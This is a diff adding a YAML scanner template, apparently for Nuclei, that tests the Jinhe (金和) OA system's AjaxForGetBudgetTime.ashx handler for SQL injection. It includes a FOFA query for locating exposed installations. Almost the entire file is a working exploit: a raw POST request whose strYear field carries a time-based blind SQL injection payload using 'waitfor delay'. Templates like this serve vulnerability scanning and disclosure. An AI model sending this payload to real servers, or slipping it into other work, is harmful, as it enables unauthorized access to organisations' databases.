@@ -1,0 +1,26 @@
+id: poc-zc128gopfplhep5g
+info:
+  name: 金和OA AjaxForGetBudgetTime.ashx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zc128gopfplhep5g'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zc128gopfplhep5g
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/AjaxForGetBudgetTime.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    strType=getTime&strTime=&strYear=1''waitfor+delay+''0:0:5''--+'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
